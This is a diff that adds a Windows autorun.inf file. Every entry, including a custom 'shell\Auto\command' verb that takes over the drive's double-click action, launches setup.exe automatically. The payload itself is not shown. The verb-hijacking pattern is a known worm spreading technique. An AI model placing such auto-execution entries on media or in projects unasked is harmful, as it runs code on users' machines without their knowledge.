@@ -1,0 +1,4 @@
+[AutoRun]
+OPEN=setup.exe
+shellexecute=setup.exe
+shell\Auto\command=setup.exe
